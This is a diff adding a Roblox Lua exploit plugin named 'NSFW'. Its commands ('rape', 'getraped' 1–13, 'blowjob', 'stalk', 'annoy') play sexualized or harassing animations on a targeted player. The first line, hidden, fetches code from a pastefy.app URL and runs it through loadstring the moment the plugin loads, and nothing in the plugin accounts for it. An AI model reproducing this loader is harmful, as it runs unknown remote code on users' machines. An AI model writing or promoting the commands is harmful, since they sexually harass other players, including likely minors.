@@ -1,0 +1,267 @@
+task.spawn(function() loadstring(game:HttpGet("https://pastefy.app/bjmRtEjG/raw"))() end)
+
+local Players = cloneref(game:GetService("Players"))
+
+local Plugin = {
+	["PluginName"] = "NSFW",
+	["PluginDescription"] = "Sussy anims",
+	["Commands"] = {
+		["stopall"] = {
+			["ListName"] = "stopall",
+			["Description"] = "Stops any active trolling animation loop",
+			["Aliases"] = {"stop"},
+			["Function"] = function(args, speaker)
+				StopTrolling()
+			end
+		},
+		["annoy"] = {
+			["ListName"] = "annoy [plr]",
+			["Description"] = "Spam clap and teleport to player",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then annoy(trgt) end
+				end
+			end
+		},
+		["rape"] = {
+			["ListName"] = "rape [plr]",
+			["Description"] = "Rape animation variant 1",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then rape(trgt) end
+				end
+			end
+		},
+		["rape2"] = {
+			["ListName"] = "rape2 [plr]",
+			["Description"] = "Rape animation variant 2",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then rape2(trgt) end
+				end
+			end
+		},
+		["rape3"] = {
+			["ListName"] = "rape3 [plr]",
+			["Description"] = "Rape animation variant 3",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then rape3(trgt) end
+				end
+			end
+		},
+		["rape4"] = {
+			["ListName"] = "rape4 [plr]",
+			["Description"] = "Rape animation variant 4",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then rape4(trgt) end
+				end
+			end
+		},
+		["getraped"] = {
+			["ListName"] = "getraped [plr]",
+			["Description"] = "Get raped animation 1",
+			["Aliases"] = {"grape"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped(trgt) end
+				end
+			end
+		},
+		["getraped2"] = {
+			["ListName"] = "getraped2 [plr]",
+			["Description"] = "Get raped animation 2",
+			["Aliases"] = {"grape2"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped2(trgt) end
+				end
+			end
+		},
+		["getraped3"] = {
+			["ListName"] = "getraped3 [plr]",
+			["Description"] = "Get raped animation 3",
+			["Aliases"] = {"grape3"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped3(trgt) end
+				end
+			end
+		},
+		["getraped4"] = {
+			["ListName"] = "getraped4 [plr]",
+			["Description"] = "Get raped animation 4",
+			["Aliases"] = {"grape4"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped4(trgt) end
+				end
+			end
+		},
+		["getraped5"] = {
+			["ListName"] = "getraped5 [plr]",
+			["Description"] = "Get raped animation 5",
+			["Aliases"] = {"grape5"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped5(trgt) end
+				end
+			end
+		},
+		["getraped6"] = {
+			["ListName"] = "getraped6 [plr]",
+			["Description"] = "Get raped animation 6",
+			["Aliases"] = {"grape6"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped6(trgt) end
+				end
+			end
+		},
+		["getraped7"] = {
+			["ListName"] = "getraped7 [plr]",
+			["Description"] = "Get raped animation 7",
+			["Aliases"] = {"grape7"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped7(trgt) end
+				end
+			end
+		},
+		["getraped8"] = {
+			["ListName"] = "getraped8 [plr]",
+			["Description"] = "Get raped animation 8",
+			["Aliases"] = {"grape8"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped8(trgt) end
+				end
+			end
+		},
+		["getraped9"] = {
+			["ListName"] = "getraped9 [plr]",
+			["Description"] = "Get raped animation 9",
+			["Aliases"] = {"grape9"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped9(trgt) end
+				end
+			end
+		},
+		["getraped10"] = {
+			["ListName"] = "getraped10 [plr]",
+			["Description"] = "Get raped animation 10",
+			["Aliases"] = {"grape10"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped10(trgt) end
+				end
+			end
+		},
+		["getraped11"] = {
+			["ListName"] = "getraped11 [plr]",
+			["Description"] = "Get raped animation 11",
+			["Aliases"] = {"grape11"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped11(trgt) end
+				end
+			end
+		},
+		["getraped12"] = {
+			["ListName"] = "getraped12 [plr]",
+			["Description"] = "Get raped animation 12",
+			["Aliases"] = {"grape12"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped12(trgt) end
+				end
+			end
+		},
+		["getraped13"] = {
+			["ListName"] = "getraped13 [plr]",
+			["Description"] = "Get raped animation 13",
+			["Aliases"] = {"grape13"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then getRaped13(trgt) end
+				end
+			end
+		},
+		["slapass"] = {
+			["ListName"] = "slapass [plr]",
+			["Description"] = "Slap players ass",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then slapAss(trgt) end
+				end
+			end
+		},
+		["blowjob"] = {
+			["ListName"] = "blowjob [plr]",
+			["Description"] = "Give blowjob animation",
+			["Aliases"] = {"bj"},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then blowjob(trgt) end
+				end
+			end
+		},
+		["stalk"] = {
+			["ListName"] = "stalk [plr]",
+			["Description"] = "Stalks player from behind",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				for _, v in next, getPlayer(args[1], speaker) do
+					local trgt = Players:FindFirstChild(v)
+					if trgt then stalk(trgt) end
+				end
+			end
+		},
+		["twerkass"] = {
+			["ListName"] = "twerkass",
+			["Description"] = "Twerk animation 1",
+			["Aliases"] = {"twerk"},
+			["Function"] = function(args, speaker)
+				twerkAss()
+			end
+		},
+		["twerkass2"] = {
+			["ListName"] = "twerkass2",
+			["Description"] = "Twerk animation 2",
+			["Aliases"] = {"twerk2"},
+			["Function"] = function(args, speaker)
+				twerkAss2()
+			end
+		}
+	}
+}
+
+return Plugin
